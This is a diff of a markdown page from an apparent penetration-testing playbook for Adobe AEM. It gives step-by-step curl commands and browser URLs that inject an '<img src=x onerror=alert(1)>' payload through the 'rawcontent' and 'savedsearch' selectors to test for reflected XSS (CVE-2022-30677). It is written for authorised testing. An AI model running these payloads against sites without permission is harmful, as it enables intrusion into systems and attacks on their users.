@@ -1,77 +1,74 @@
-# Batch 09 — Selector XSS: `rawcontent` + `savedsearch`
+# Batch 09 — XSS cheat code `rawcontent`
 
-## objective
+## GOAL
+See if adding `.rawcontent.html` turns a reflected path into script (XSS).
 
-Test the **reflected XSS** gadget family based on `rawcontent` (and `savedsearch` for 400 pages). Only XSS — no QueryBuilder.
+## TIME
+~1 hour
 
-## estimated_time
+## YOU NEED
+- XSS allowed in scope
+- Browser for final check
 
-45–75 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- `T` from batch 01
-- XSS testing allowed in scope
-- Prefer browser + proxy for final proof
+AEM has **selectors** = extra words in the URL that change how a page renders.
 
-## testing_workflow
+`rawcontent` was meant to strip fancy JS/CSS for export.  
+On old/misconfigured boxes it also **broke HTML cleaning**, so a path like  
+`/<img ...>.rawcontent.html` ran as script.  
+If the 404 page is fixed, `savedsearch` + `rawcontent` hits a different error page that still reflects.
 
-### 1) Technique A — rawcontent on reflected path (404 style)
+---
+
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
+```
 
-# Safe marker first (no alert)
-curl -sk -o /tmp/x.html -w "%{http_code} %{size_download}\n" \
+### 1) Safe marker (no alert)
+
+```bash
+curl -sk -o /tmp/x.html -w "%{http_code}\n" \
   "$T/aemxssmarker123.rawcontent.html"
 grep -n 'aemxssmarker123' /tmp/x.html | head
 ```
 
+### 2) XSS path (historical)
+
 ```bash
-# Payload path (historical CVE-2022-30677)
 curl -sk -o /tmp/x.html -w "%{http_code}\n" \
   "$T/%3Cimg%20src=x%20onerror=alert(1)%3E.rawcontent.html"
 grep -iE 'onerror|<img' /tmp/x.html | head
 ```
 
-Open in browser if reflection looks unsanitized:
+Browser if it looks raw:
 
 ```text
-https://TARGET/<img src=x onerror=alert(1)>.rawcontent.html
+https://SITE/<img src=x onerror=alert(1)>.rawcontent.html
 ```
 
-### 2) Technique B — savedsearch + rawcontent (400 path)
-
-When custom 404 kills technique A:
+### 3) Backup error page
 
 ```bash
 curl -sk -o /tmp/x.html -w "%{http_code}\n" \
   "$T/%3Cimg%20src=x%20onerror=alert(1).savedsearch.rawcontent.html"
-grep -iE 'onerror|<img|savedsearch' /tmp/x.html | head
+grep -iE 'onerror|<img' /tmp/x.html | head
 ```
 
-Browser:
+---
 
-```text
-https://TARGET/<img src=x onerror=alert(1).savedsearch.rawcontent.html
-```
+## IF / THEN
 
-### 3) Technique C — does rawcontent still strip JS? (optional, 10 min)
+| What you saw | What you do |
+|--------------|-------------|
+| alert / raw onerror in HTML | PoC saved → **NEXT** |
+| Marker not in page | Custom errors / patched → **NEXT** anyway |
 
-If you already have HTML injection elsewhere, request same resource with `.rawcontent.html` and see if page JS is stripped (can revive a sink). Note only — no rabbit hole.
+---
 
-## decision_points
-
-| If… | Then… |
-|-----|--------|
-| XSS fires | Capture PoC; continue **10** for more selector impact |
-| Reflects but encoded | Try encoding variants 15 min max; then **10** |
-| No reflection | Patched/custom errors — **10** |
-
-## expected_findings
-
-- Unauth reflected XSS (or residual strip behavior)
-
-## next_batch_to_continue_with
-
-→ **[10-listparagraphs.md](./10-listparagraphs.md)**
+## NEXT
+→ [10-listparagraphs.md](./10-listparagraphs.md)
